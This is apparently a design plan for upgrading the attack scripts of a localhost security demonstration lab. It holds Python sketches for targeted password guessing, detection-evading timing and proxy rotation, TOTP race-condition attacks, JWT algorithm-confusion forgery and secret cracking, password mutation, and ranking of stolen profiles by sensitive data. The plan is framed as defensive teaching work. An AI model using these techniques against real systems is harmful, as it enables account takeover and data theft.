# Attack Upgrade Plan - Realistic Security Demonstrations

**Date**: 2025-11-16
**Status**: Design Phase
**Objective**: Transform basic attack scripts into sophisticated, real-world pentesting scenarios

---

## Current State Analysis

All 7 attacks are **functional but basic**:
- ✅ Work correctly and demonstrate vulnerabilities
- ✅ Track metrics and generate reports
- ❌ Use trivial wordlists and patterns (common_passwords = ["admin", "password", "123456"])
- ❌ Missing intelligence-based techniques from real pentests
- ❌ No adversarial thinking (pattern detection, CAPTCHA bypass, behavior mimicking)
- ❌ Limited attack sophistication (no timing attacks, race conditions, advanced enumeration)

---

## Upgrade Strategy by Attack

### 1. Brute Force → **Intelligent Credential Attack**

**Current Weaknesses**:
- Static wordlist with predictable passwords
- No target analysis or OSINT
- Fixed delay/concurrency (easy to detect)
- No adaptive behavior based on responses

**Realistic Upgrades**:

#### A. Smart Wordlist Generation
```python
class IntelligentPasswordGenerator:
    def generate_targeted_wordlist(self, target_info: TargetInfo) -> List[str]:
        """
        Real pentester approach:
        - Company name variations (CompanyName123, CompanyName!)
        - Season + Year (Summer2024!, Winter2025)
        - Common patterns + company context
        - Leaked password analysis (Dehashed, HIBP)
        """
        passwords = []

        # Company-specific patterns
        if target_info.company_name:
            passwords.extend([
                f"{target_info.company_name}123",
                f"{target_info.company_name}!",
                f"{target_info.company_name}@2024",
                f"{target_info.company_name}{datetime.now().year}",
            ])

        # Season + Year patterns (very common in corporate)
        current_season = self.get_current_season()
        current_year = datetime.now().year
        passwords.extend([
            f"{current_season}{current_year}",
            f"{current_season}{current_year}!",
            f"Welcome{current_year}",
        ])

        # Leaked password correlation
        # Simulate checking common patterns from breaches
        passwords.extend(self.get_breach_patterns())

        return passwords
```

#### B. Adaptive Rate Control
```python
class AdaptiveRateLimiter:
    """
    Mimics human behavior:
    - Random delays (not fixed 0.1s)
    - Bursts followed by pauses
    - Different patterns during business hours
    - Slows down when detecting rate limits
    """
    def calculate_delay(self, attempt_num: int, response: Response) -> float:
        if response.status_code == 429:
            # Detected rate limit - back off exponentially
            return random.uniform(5.0, 15.0)

        # Human-like timing
        base_delay = random.gauss(mu=2.0, sigma=0.5)  # Normal distribution

        # Add random "thinking time" bursts
        if random.random() < 0.1:  # 10% chance
            return base_delay + random.uniform(10, 30)  # Coffee break

        return max(0.5, base_delay)
```

#### C. OSINT Integration
```python
def perform_osint(username: str, target_domain: str) -> Dict:
    """
    Gather intelligence before attacking:
    - Check HaveIBeenPwned for known breaches
    - Search social media for password hints
    - Enumerate email format (firstname.lastname@company.com)
    - Check public repositories for accidental commits
    """
    osint_data = {
        "breaches": self.check_hibp(username),
        "email_pattern": self.enumerate_email_format(target_domain),
        "social_hints": self.search_social_media(username),
        "leaked_credentials": self.search_dehashed(username),
    }
    return osint_data
```

**Implementation Priority**: HIGH
**Complexity**: Medium
**Real-World Impact**: Demonstrates how attackers actually approach brute force

---

### 2. MFA Bruteforce → **TOTP Timing Attack & Race Conditions**

**Current Weaknesses**:
- Sequential code testing (000000, 111111, ...)
- No timing window exploitation
- No race condition exploitation
- Doesn't leverage TOTP algorithm weaknesses

**Realistic Upgrades**:

#### A. TOTP Time Window Exploitation
```python
class TOTPTimingAttack:
    """
    Real-world TOTP weaknesses:
    - TOTP codes valid for ±30s window (some implementations allow ±60s)
    - Test codes from previous/next window simultaneously
    - Exploit clock skew between client/server
    """
    def generate_time_window_codes(self, shared_secret: str) -> List[str]:
        current_time = time.time()
        codes = []

        # Test current window
        totp = pyotp.TOTP(shared_secret, interval=30)
        codes.append(totp.at(current_time))

        # Test ±1 window (many servers accept this)
        codes.append(totp.at(current_time - 30))
        codes.append(totp.at(current_time + 30))

        # Test ±2 windows (misconfigured servers)
        codes.append(totp.at(current_time - 60))
        codes.append(totp.at(current_time + 60))

        return codes
```

#### B. Race Condition Exploitation
```python
async def race_condition_attack(self, challenge_id: str, code: str):
    """
    Exploit race conditions in MFA validation:
    - Send same code 100 times simultaneously
    - Some implementations don't properly lock used codes
    - If one request succeeds before lock, all might succeed
    """
    tasks = []
    for _ in range(100):
        task = self.attempt_mfa_code(challenge_id, code)
        tasks.append(task)

    # Fire all at exact same time
    results = await asyncio.gather(*tasks)

    # Check if race condition allowed bypass
    successes = [r for r in results if r["outcome"] == "success"]
    return len(successes) > 1  # More than 1 success = race condition
```

#### C. Statistical Analysis Attack
```python
class StatisticalMFAAttack:
    """
    Reduce search space using statistics:
    - Humans tend to prefer certain digit patterns
    - 123456 more likely than 982371
    - Birthday dates (MMDDYY format in 6 digits)
    - Repeated digits (111111, 777777)
    """
    def generate_high_probability_codes(self, user_info: dict) -> List[str]:
        codes = []

        # Birthday-based (if we know DOB from OSINT)
        if user_info.get("birthday"):
            dob = user_info["birthday"]
            codes.extend([
                dob.strftime("%m%d%y"),
                dob.strftime("%d%m%y"),
                dob.strftime("%y%m%d"),
            ])

        # Common psychological patterns
        codes.extend([
            "123456", "654321", "111111", "000000",
            "112233", "121212", "696969", "420420",
        ])

        return codes
```

**Implementation Priority**: HIGH
**Complexity**: Medium-High
**Real-World Impact**: TOTP timing attacks are commonly used in real pentests

---

### 3. IDOR Exploit → **Advanced Enumeration & Data Mining**

**Current Weaknesses**:
- Simple sequential ID enumeration (1, 2, 3, ...)
- No pattern detection
- Doesn't identify high-value targets
- No data correlation analysis

**Realistic Upgrades**:

#### A. Smart Enumeration Patterns
```python
class SmartIDOREnumerator:
    """
    Real pentesters don't just test 1-10:
    - Binary search for ID ranges (test 1, 1000, 500, 250...)
    - Pattern detection (UUIDs, timestamps, hashes)
    - Predictable ID generation (auto-increment, timestamp-based)
    """
    def detect_id_pattern(self, sample_ids: List[int]) -> str:
        # Check if IDs are sequential
        if self.is_sequential(sample_ids):
            return "sequential"

        # Check if timestamp-based (e.g., Unix epoch)
        if self.is_timestamp_based(sample_ids):
            return "timestamp"

        # Check if UUID/hash-based
        if self.is_uuid_based(sample_ids):
            return "uuid"

        return "unknown"

    def enumerate_efficiently(self, pattern: str, start: int, end: int):
        if pattern == "sequential":
            # Test every ID
            return range(start, end)
        elif pattern == "timestamp":
            # Generate likely timestamps
            return self.generate_timestamp_ids()
        elif pattern == "uuid":
            # Try UUID prediction attacks
            return self.predict_uuids()
```

#### B. High-Value Target Identification
```python
class DataMiner:
    """
    Prioritize valuable data exfiltration:
    - Admin/privileged accounts first
    - Accounts with sensitive data (SSN, credit cards)
    - Recently active accounts
    - Accounts with API keys
    """
    def rank_targets(self, profiles: List[dict]) -> List[dict]:
        ranked = []
        for profile in profiles:
            score = 0

            # Role-based scoring
            if profile["role"] == "admin":
                score += 100
            elif profile["role"] == "developer":
                score += 50

            # Sensitive data scoring
            if profile.get("ssn"):
                score += 30
            if profile.get("credit_card"):
                score += 30
            if profile.get("api_key"):
                score += 40

            profile["value_score"] = score
            ranked.append(profile)

        return sorted(ranked, key=lambda x: x["value_score"], reverse=True)
```

#### C. Cross-Reference Analysis
```python
class CrossReferenceAnalyzer:
    """
    Correlate stolen data across endpoints:
    - Profile data + settings data = complete picture
    - Find relationships between users
    - Identify privilege escalation paths
    """
    def correlate_data(self, profiles: List, settings: List) -> Dict:
        correlation = {}

        for profile in profiles:
            user_id = profile["user_id"]
            correlation[user_id] = {
                "profile": profile,
                "settings": self.find_settings(user_id, settings),
                "relationships": self.find_relationships(user_id, profiles),
                "attack_surface": self.calculate_attack_surface(profile),
            }

        return correlation
```

**Implementation Priority**: MEDIUM
**Complexity**: Medium
**Real-World Impact**: Shows how IDOR leads to mass data exfiltration

---

### 4. Direct Access → **Service Fingerprinting & Protocol Analysis**

**Current Weaknesses**:
- Only tests known endpoints
- No service discovery
- Missing version detection
- No protocol-level attacks

**Realistic Upgrades**:

#### A. Service Fingerprinting
```python
class ServiceFingerprinter:
    """
    Identify service technology and version:
    - Parse Server headers
    - Analyze response timing
    - Check for known vulnerabilities in detected versions
    - Map internal service mesh
    """
    def fingerprint_service(self, url: str) -> dict:
        response = requests.get(url)

        fingerprint = {
            "server": response.headers.get("Server"),
            "framework": self.detect_framework(response),
            "version": self.detect_version(response),
            "technologies": self.detect_technologies(response),
            "known_vulns": [],
        }

        # Check CVE database for known vulnerabilities
        if fingerprint["framework"] and fingerprint["version"]:
            fingerprint["known_vulns"] = self.check_cve_database(
                fingerprint["framework"],
                fingerprint["version"]
            )

        return fingerprint
```

#### B. Service Discovery
```python
class ServiceDiscovery:
    """
    Discover internal services:
    - Port scanning
    - Endpoint fuzzing
    - Docker network enumeration
    - Service mesh mapping
    """
    def discover_services(self, base_port: int = 8000, port_range: int = 100):
        discovered = []

        for port in range(base_port, base_port + port_range):
            if self.is_port_open("localhost", port):
                service_info = {
                    "port": port,
                    "protocol": self.detect_protocol(port),
                    "service_type": self.identify_service(port),
                    "accessible": True,
                }
                discovered.append(service_info)

        return discovered
```

#### C. Protocol-Level Attacks
```python
class ProtocolAttacker:
    """
    Exploit protocol weaknesses:
    - HTTP verb tampering
    - Header injection
    - Request smuggling
    - Websocket hijacking
    """
    def test_http_verbs(self, url: str):
        verbs = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
        results = {}

        for verb in verbs:
            response = requests.request(verb, url)
            results[verb] = {
                "status": response.status_code,
                "allowed": response.status_code != 405,
                "dangerous": verb in ["TRACE", "DELETE"] and response.status_code == 200,
            }

        return results
```

**Implementation Priority**: MEDIUM
**Complexity**: Medium-High
**Real-World Impact**: Demonstrates reconnaissance phase of real attacks

---

### 5. Rate Limit Bypass → **Distributed Evasion Techniques**

**Current Weaknesses**:
- Only tests User-Agent rotation (doesn't work)
- No actual IP rotation
- Missing advanced evasion techniques
- No distributed attack simulation

**Realistic Upgrades**:

#### A. IP Rotation Simulation
```python
class DistributedAttackSimulator:
    """
    Simulate distributed attacks:
    - Proxy rotation (Tor, VPN, cloud IPs)
    - Residential proxy networks
    - Botnet simulation
    - Geographic distribution
    """
    def simulate_proxy_rotation(self, proxies: List[str]):
        # In real attack: actual proxy list from provider
        # Here: simulate by tracking separate rate limit buckets per "IP"

        attack_stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "requests_per_proxy": defaultdict(int),
        }

        for _ in range(1000):  # 1000 requests total
            proxy = random.choice(proxies)

            # Each proxy gets its own rate limit bucket
            response = self.make_request(proxy=proxy)

            attack_stats["requests_per_proxy"][proxy] += 1
            if response.status_code == 200:
                attack_stats["successful_requests"] += 1

        return attack_stats
```

#### B. Request Signature Randomization
```python
class RequestRandomizer:
    """
    Evade fingerprinting detection:
    - Random User-Agents (realistic browser signatures)
    - Random Accept-Language headers
    - Random screen resolutions (in JavaScript)
    - Cookie randomization
    - TLS fingerprint randomization
    """
    def generate_realistic_headers(self) -> dict:
        browsers = self.get_real_browser_signatures()  # From actual browsers
        browser = random.choice(browsers)

        return {
            "User-Agent": browser["user_agent"],
            "Accept": browser["accept"],
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": random.choice(["1", None]),
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
        }
```

#### C. Timing Pattern Evasion
```python
class TimingEvasion:
    """
    Avoid detection through timing analysis:
    - Mimic human interaction patterns
    - Avoid uniform request intervals
    - Add realistic pauses
    - Simulate browsing behavior
    """
    def generate_human_like_delay(self) -> float:
        # Real humans don't click exactly every N seconds
        delay_patterns = [
            lambda: random.expovariate(1/3),  # Exponential distribution
            lambda: random.gauss(5, 2),  # Normal distribution
            lambda: random.uniform(1, 10) if random.random() < 0.1 else random.uniform(0.5, 3),
        ]

        pattern = random.choice(delay_patterns)
        return max(0.1, pattern())
```

**Implementation Priority**: HIGH
**Complexity**: High
**Real-World Impact**: Shows how rate limiting is bypassed by professionals

---

### 6. Token Replay → **JWT Manipulation & Algorithm Confusion**

**Current Weaknesses**:
- Basic token reuse testing
- No JWT algorithm exploitation
- Missing signature bypass techniques
- No key confusion attacks

**Realistic Upgrades**:

#### A. Algorithm Confusion Attack
```python
class JWTAlgorithmConfusion:
    """
    Exploit 'none' algorithm and RS256->HS256 confusion:
    - Change alg: RS256 → none
    - Change alg: RS256 → HS256 (use public key as secret)
    - Remove signature
    """
    def test_none_algorithm(self, original_token: str) -> dict:
        parts = original_token.split(".")
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))

        # Change algorithm to 'none'
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip("=")

        # Remove signature
        tampered_token = f"{new_header}.{parts[1]}."

        return {
            "technique": "none algorithm",
            "original_alg": header.get("alg", "unknown"),
            "tampered_token": tampered_token,
        }

    def test_rs256_to_hs256_confusion(self, token: str, public_key: str):
        """
        If server uses RS256 but doesn't verify algorithm:
        - Change alg to HS256
        - Sign with public key (treated as symmetric secret)
        """
        parts = token.split(".")
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

        # Change to HS256
        header["alg"] = "HS256"

        # Sign with public key as HMAC secret
        import hmac
        import hashlib

        new_header = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b"=")
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b"=")

        signature = hmac.new(
            public_key.encode(),
            f"{new_header}.{new_payload}".encode(),
            hashlib.sha256
        ).digest()

        new_signature = base64.urlsafe_b64encode(signature).rstrip(b"=")

        return f"{new_header}.{new_payload}.{new_signature}"
```

#### B. Claims Manipulation
```python
class JWTClaimsManipulator:
    """
    Advanced JWT payload manipulation:
    - Extend expiration time
    - Change user role (user → admin)
    - Modify user_id
    - Add custom claims
    """
    def privilege_escalation_attack(self, token: str) -> List[str]:
        attacks = []
        parts = token.split(".")
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

        # Attack 1: Change role to admin
        payload_admin = payload.copy()
        payload_admin["role"] = "admin"
        attacks.append(self.create_tampered_token(parts[0], payload_admin, parts[2]))

        # Attack 2: Extend expiration by 1 year
        payload_extended = payload.copy()
        payload_extended["exp"] = int(time.time()) + 31536000
        attacks.append(self.create_tampered_token(parts[0], payload_extended, parts[2]))

        # Attack 3: Change user_id
        payload_user = payload.copy()
        payload_user["sub"] = "admin"
        attacks.append(self.create_tampered_token(parts[0], payload_user, parts[2]))

        return attacks
```

#### C. JWT Secret Brute Force
```python
class JWTSecretBruteforce:
    """
    Attempt to crack JWT secret:
    - Use common secrets wordlist
    - Check for weak secrets (secret, 123456, etc.)
    - If secret is cracked, can forge any token
    """
    def attempt_secret_crack(self, token: str, wordlist: List[str]) -> Optional[str]:
        parts = token.split(".")
        header_payload = f"{parts[0]}.{parts[1]}"
        original_signature = parts[2]

        for secret in wordlist:
            # Try signing with this secret
            signature = base64.urlsafe_b64encode(
                hmac.new(
                    secret.encode(),
                    header_payload.encode(),
                    hashlib.sha256
                ).digest()
            ).decode().rstrip("=")

            if signature == original_signature:
                return secret  # Secret found!

        return None
```

**Implementation Priority**: MEDIUM-HIGH
**Complexity**: Medium
**Real-World Impact**: JWT attacks are extremely common in modern apps

---

### 7. Credential Stuffing → **Breach Database Simulation**

**Current Weaknesses**:
- Generic username:password file
- No breach source correlation
- Missing credential intelligence
- No password mutation rules

**Realistic Upgrades**:

#### A. Breach Database Simulation
```python
class BreachDatabaseSimulator:
    """
    Simulate real breach databases (Collection #1, RockYou, etc.):
    - Generate realistic leaked credentials
    - Include metadata (breach source, date)
    - Correlate emails across multiple breaches
    - Track password reuse patterns
    """
    def generate_realistic_breach_data(self) -> List[dict]:
        breaches = [
            {
                "name": "LinkedIn 2012",
                "date": "2012-06-05",
                "passwords_hashed": True,
                "hash_type": "SHA1",
                "credentials_count": 6500000,
            },
            {
                "name": "Collection #1",
                "date": "2019-01-16",
                "passwords_hashed": False,
                "credentials_count": 773000000,
            },
            {
                "name": "RockYou 2021",
                "date": "2021-06-01",
                "passwords_hashed": False,
                "credentials_count": 8400000000,
            },
        ]

        # Generate credentials with breach metadata
        credentials = []
        for breach in breaches:
            for _ in range(100):  # Sample from each breach
                cred = {
                    "email": self.generate_realistic_email(),
                    "password": self.generate_password_from_breach(breach),
                    "breach_source": breach["name"],
                    "breach_date": breach["date"],
                    "confidence": self.calculate_confidence(breach),
                }
                credentials.append(cred)

        return credentials
```

#### B. Password Mutation Engine
```python
class PasswordMutationEngine:
    """
    Real attackers mutate leaked passwords:
    - Add current year (Password123 → Password2024)
    - Add special chars (Password → Password!)
    - Capitalize first letter (password → Password)
    - Leet speak (password → p@ssw0rd)
    - Keyboard walks (qwerty → qwerty123)
    """
    def mutate_password(self, base_password: str) -> List[str]:
        mutations = []

        # Year suffix
        current_year = datetime.now().year
        mutations.append(f"{base_password}{current_year}")
        mutations.append(f"{base_password}{str(current_year)[-2:]}")

        # Special char suffix
        for char in ["!", "@", "#", "$", "123"]:
            mutations.append(f"{base_password}{char}")

        # Capitalization
        mutations.append(base_password.capitalize())
        mutations.append(base_password.upper())

        # Leet speak
        leet_map = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "$"}
        leet_password = "".join(leet_map.get(c.lower(), c) for c in base_password)
        mutations.append(leet_password)

        return mutations
```

#### C. Credential Intelligence
```python
class CredentialIntelligence:
    """
    Prioritize credentials based on intelligence:
    - Email domain matches target domain
    - Password recently used in other breaches
    - User known to reuse passwords
    - Credential from recent breach (higher success rate)
    """
    def rank_credentials(self, credentials: List[dict], target_domain: str) -> List[dict]:
        for cred in credentials:
            score = 0

            # Domain match
            if target_domain in cred["email"]:
                score += 50

            # Recent breach (passwords more likely still in use)
            breach_age_days = (datetime.now() - datetime.fromisoformat(cred["breach_date"])).days
            if breach_age_days < 365:
                score += 30
            elif breach_age_days < 1825:  # 5 years
                score += 10

            # Password complexity (simple passwords reused more often)
            if len(cred["password"]) < 10 and cred["password"].isalnum():
                score += 20

            cred["priority_score"] = score

        return sorted(credentials, key=lambda x: x["priority_score"], reverse=True)
```

**Implementation Priority**: MEDIUM
**Complexity**: Medium
**Real-World Impact**: Shows realistic credential stuffing methodology

---

## Implementation Roadmap

### Phase 1: High-Impact Quick Wins (Week 1)
1. **Brute Force** - Intelligent wordlist generation + adaptive rate control
2. **Rate Limit Bypass** - Distributed attack simulation + request randomization
3. **MFA Bypass** - TOTP timing window exploitation

### Phase 2: Advanced Techniques (Week 2)
4. **IDOR** - Smart enumeration + data mining
5. **JWT Manipulation** - Algorithm confusion + claims tampering
6. **Direct Access** - Service fingerprinting + discovery

### Phase 3: Intelligence Integration (Week 3)
7. **Credential Stuffing** - Breach database simulation + mutations
8. All attacks - Add OSINT integration
9. All attacks - Enhanced reporting with attack graphs

### Phase 4: Evasion & Stealth (Week 4)
10. All attacks - Behavior mimicking (human-like patterns)
11. All attacks - Detection evasion techniques
12. All attacks - Distributed execution support

---

## New Metrics to Track

```python
# Add to each attack script
new_metrics = {
    # Intelligence
    "osint_sources_used": int,
    "target_info_gathered": dict,
    "wordlist_intelligence_score": float,

    # Evasion
    "detection_events": int,
    "captcha_encountered": int,
    "ip_bans_received": int,
    "successful_evasions": int,

    # Effectiveness
    "time_to_first_success": float,
    "success_rate_by_technique": dict,
    "high_value_targets_compromised": int,

    # Advanced
    "race_conditions_exploited": int,
    "timing_attacks_successful": int,
    "algorithm_confusions_successful": int,
}
```

---

## Testing Strategy

Each upgraded attack must demonstrate:

1. **Realism**: Uses techniques from actual pentest reports
2. **Detection**: Triggers new metrics in monitoring
3. **Documentation**: Clear explanation of technique and defense
4. **Ethical Boundaries**: Clear warnings and localhost-only by default

---

## Expected Outcomes

### Before (Current)
- ❌ Basic wordlist: ["admin", "password", "123456"]
- ❌ Fixed timing (0.1s delay)
- ❌ Sequential enumeration (1, 2, 3...)
- ❌ Simple token reuse testing

### After (Upgraded)
- ✅ Intelligent wordlists (company+year, season+year, OSINT-based)
- ✅ Human-like behavior (random delays, bursts, pauses)
- ✅ Smart enumeration (binary search, pattern detection)
- ✅ Advanced JWT attacks (algorithm confusion, key confusion)
- ✅ Distributed simulation (proxy rotation, IP distribution)
- ✅ Timing attacks (TOTP windows, race conditions)
- ✅ Data mining (high-value target identification)

---

## Risk Assessment

| Attack | Risk if Successful | Defense Demonstration Value | Implementation Complexity |
|--------|-------------------|---------------------------|--------------------------|
| Intelligent Brute Force | HIGH | HIGH | Medium |
| TOTP Timing Attack | CRITICAL | HIGH | Medium-High |
| Advanced IDOR | CRITICAL | HIGH | Medium |
| Service Fingerprinting | MEDIUM | MEDIUM | Medium-High |
| Distributed Rate Bypass | HIGH | HIGH | High |
| JWT Algorithm Confusion | CRITICAL | CRITICAL | Medium |
| Breach Database Stuffing | HIGH | HIGH | Medium |

---

## Documentation Requirements

Each upgraded attack must include:

1. **Technical Writeup**: Explaining the technique
2. **Defense Guide**: How to prevent this attack
3. **Detection Guide**: How to detect this attack in logs/metrics
4. **Demo Video**: Screen recording showing the attack
5. **MITRE ATT&CK Mapping**: Relevant tactics and techniques

---

## Success Criteria

An attack upgrade is complete when:

- ✅ Uses realistic techniques from bug bounty reports
- ✅ Generates meaningful new metrics
- ✅ Triggers appropriate incident response runbooks
- ✅ Includes comprehensive documentation
- ✅ Passes peer review for realism
- ✅ Demonstrates both attack AND defense

---

**Next Step**: Begin implementation with Phase 1 (High-Impact Quick Wins)
